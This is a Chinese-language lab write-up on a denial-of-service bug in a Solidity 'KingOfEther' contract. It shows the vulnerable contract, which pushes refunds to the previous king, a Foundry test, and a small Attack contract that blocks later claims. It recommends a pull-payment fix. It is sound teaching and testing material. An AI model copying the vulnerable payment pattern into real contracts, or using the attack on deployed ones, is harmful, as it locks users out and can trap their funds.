# 拒绝服务  
[DOS.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/DOS.sol)  
**名称：** 拒绝服务  
KingOfEther合约有一个游戏，用户可以通过发送比当前余额更多的以太币来夺取王位。  
当新用户发送更多以太币时，合约试图将之前的余额返还给最后一个“国王”。   
然而，这个机制是有漏洞的。攻击者的合约（这里称为Attack合约）可以成为王者，然后使回退函数回滚或消耗超过规定的gas限制，每当KingOfEther合约试图将以太币返回给最后一个国王时，claimThrone函数就会失败。  


**修复意见：**  
使用“拉取”支付模式，防止这种情况的一种方法是使用户能够提取他们的以太币，而不是将其发送给他们。  
**参考：**  
https://slowmist.medium.com/intro-to-smart-contract-security-audit-dos-e23e9e901e26   
**KingOfEther合约：**  
```
contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}
```  
**如何测试：**  
forge test --contracts src/test/DOS.sol -vvvv  
```
// 此函数测试拒绝服务(DoS)攻击场景
function testDOS() public {
    // “Alice”和“Bob”是从以太坊虚拟机分配的地址值。
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    // Alice和Bob分别获得4个以太币和2个以太币。
    vm.deal(address(alice), 4 ether);
    vm.deal(address(bob), 2 ether);

    // Alice的地址调用一些prank函数
    vm.prank(alice);

    // Alice试图通过发送1个以太币来夺取KingOfEtherContract的王位
    KingOfEtherContract.claimThrone{value: 1 ether}();

    // 再次调用prank函数，这次使用Bob的地址。
    vm.prank(bob);

    // Bob试图通过发送2个以太币来夺取王位
    KingOfEtherContract.claimThrone{value: 2 ether}();

    // 记录Alice在返回1个以太币后的余额
    console.log("Return 1 ETH to Alice, Alice of balance", address(alice).balance);

    // 攻击合约被调用，用3个以太币攻击KingOfEtherContract合约
    AttackerContract.attack{value: 3 ether}();

    // 记录KingOfEtherContract合约的余额
    console.log("Balance of KingOfEtherContract", KingOfEtherContract.balance());

    // 记录一条消息，表明攻击已完成，Alice将无法再次夺取王位。
    console.log("Attack completed, Alice claimthrone again, she will fail");

    // 使用Alice的地址再次调用prank函数，预期该过程需要回滚。
    vm.prank(alice);
    vm.expectRevert("Failed to send Ether");

    // Alice试图再次夺取王位，但由于DoS攻击而失败。
    KingOfEtherContract.claimThrone{value: 4 ether}();
}

// 对KingOfEther合约发起DoS攻击的攻击合约
contract Attack {
    KingOfEther kingOfEther;

    // 初始化KingOfEther合约的构造函数。
    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // 通过向KingOfEther合约发送以太币来夺取王位的攻击函数。
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```  
**红框：在攻击漏洞后，没有人能够赢得这个游戏  
![Alt text](image-12.png)

